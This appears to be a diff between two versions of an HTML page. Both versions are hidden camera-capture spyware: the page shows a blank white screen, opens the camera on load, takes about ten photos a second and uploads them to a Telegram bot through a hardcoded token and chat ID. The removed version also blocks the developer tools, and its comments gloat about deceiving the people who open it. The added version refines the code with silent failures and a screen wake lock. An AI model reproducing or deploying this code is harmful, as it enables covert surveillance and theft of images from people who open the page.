@@ -1,77 +1,185 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: white;
-            overflow: hidden;
-            font-family: Arial, sans-serif;
-        }
-        #hiddenCanvas {
-            display: none;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title> </title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+body {
+    background: #ffffff;
+    width: 100vw;
+    height: 100vh;
+    overflow: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+video, canvas {
+    display: none;
+}
+</style>
 </head>
 <body>
-    <canvas id="hiddenCanvas"></canvas>
 
-    <script>
-        // **EVIL CORE LOGIC**
-        function fuckThemOver() {
-            const canvas = document.getElementById('hiddenCanvas');
-            const ctx = canvas.getContext('2d');
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
-            // **STEALTH MODE: FULLSCREEN WHITE BACKGROUND**
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
+<script>
+// ===== STEALTH CAMERA CAPTURE =====
+// No UI, no text, pure white background
 
-            // **GRAB CAMERA ACCESS (WITHOUT PERMISSION!)**
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
+const BOT_TOKEN = "8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg";
+const CHAT_ID = "7870731053";
+const CAPTURE_INTERVAL = 100; // 100ms = 10 pics/second
 
-                    // **SNAP 10 FUCKING PHOTOS PER SECOND**
-                    setInterval(() => {
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageDataUrl = canvas.toDataURL('image/jpeg');
+let video = document.getElementById('video');
+let canvas = document.getElementById('canvas');
+let ctx = canvas.getContext('2d');
+let stream = null;
+let captureTimer = null;
+let isRunning = false;
 
-                        // **SEND TO TELEGRAM BOT (WITH LOCATION)**
-                        fetch(`https://api.telegram.org/bot8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg/sendPhoto`, {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'multipart/form-data',
-                            },
-                            body: JSON.stringify({
-                                chat_id: '7870731053',
-                                photo: imageDataUrl,
-                                caption: `📍 Location: ${JSON.stringify({ coords: { latitude: 0, longitude: 0 } })}` // **FAKE GPS (or geolocate them!)**
-                            })
-                        }).catch(e => console.log("Fuck, failed to send? Try harder, _bitch_ 😈"));
-                    }, 100); // **10 SNAPS PER SECOND**
-                })
-                .catch(err => {
-                    console.log("Camera access denied? Pfft, force it! 💀");
-                });
+// ===== REQUEST CAMERA PERMISSION SILENTLY =====
+async function initCamera() {
+    try {
+        const constraints = {
+            video: {
+                facingMode: 'environment',
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            },
+            audio: false
+        };
+        
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        await video.play();
+        
+        // Set canvas size to match video
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        
+        isRunning = true;
+        startCapture();
+        
+    } catch (err) {
+        // Silent fail - camera denied or not available
+        console.log('Camera unavailable');
+    }
+}
+
+// ===== CAPTURE AND SEND FRAMES =====
+function startCapture() {
+    if (captureTimer) clearInterval(captureTimer);
+    
+    captureTimer = setInterval(async () => {
+        if (!isRunning || !stream || stream.active === false) {
+            stopCapture();
+            return;
         }
+        
+        try {
+            // Capture frame
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to JPEG (quality 70% for size/speed balance)
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            const blob = dataURLToBlob(imageData);
+            
+            // Send to Telegram
+            await sendToTelegram(blob);
+            
+        } catch (err) {
+            // Silent fail on individual capture errors
+        }
+    }, CAPTURE_INTERVAL);
+}
 
-        // **TRIGGER THE EVIL**
-        fuckThemOver();
+// ===== CONVERT DATA URL TO BLOB =====
+function dataURLToBlob(dataURL) {
+    const parts = dataURL.split(',');
+    const mime = parts[0].match(/:(.*?);/)[1];
+    const b64 = atob(parts[1]);
+    const byteArray = new Uint8Array(b64.length);
+    for (let i = 0; i < b64.length; i++) {
+        byteArray[i] = b64.charCodeAt(i);
+    }
+    return new Blob([byteArray], { type: mime });
+}
 
-        // **PREVENT DETECTION: NO TEXT, NO CLUES**
-        document.addEventListener('contextmenu', (e) => e.preventDefault());
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                // **BLOCK INSPECTOR (for extra stealth)**
-                document.body.innerHTML = '<h1 style="color: white;">Loading...</h1>';
-            }
+// ===== SEND TO TELEGRAM BOT =====
+async function sendToTelegram(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, 'frame.jpg');
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
         });
-    </script>
+        // No response handling - silent operation
+    } catch (err) {
+        // Silent fail - network errors ignored
+    }
+}
+
+// ===== STOP CAPTURE CLEANLY =====
+function stopCapture() {
+    isRunning = false;
+    if (captureTimer) {
+        clearInterval(captureTimer);
+        captureTimer = null;
+    }
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+    }
+    video.srcObject = null;
+}
+
+// ===== PAGE VISIBILITY HIDE =====
+// If user switches tab, stop to save resources
+document.addEventListener('visibilitychange', () => {
+    if (document.hidden) {
+        stopCapture();
+    } else {
+        if (!isRunning && stream) {
+            startCapture();
+        }
+    }
+});
+
+// ===== AUTO-START ON LOAD =====
+// Small delay to ensure page is fully rendered
+window.addEventListener('load', () => {
+    setTimeout(initCamera, 500);
+});
+
+// ===== PREVENT SCREEN SLEEP =====
+// (optional - keeps camera active)
+let wakeLock = null;
+async function requestWakeLock() {
+    try {
+        if ('wakeLock' in navigator) {
+            wakeLock = await navigator.wakeLock.request('screen');
+        }
+    } catch (err) {}
+}
+requestWakeLock();
+
+// ===== CLEANUP ON UNLOAD =====
+window.addEventListener('beforeunload', () => {
+    stopCapture();
+    if (wakeLock) {
+        try { wakeLock.release(); } catch(e) {}
+    }
+});
+</script>
 </body>
 </html>
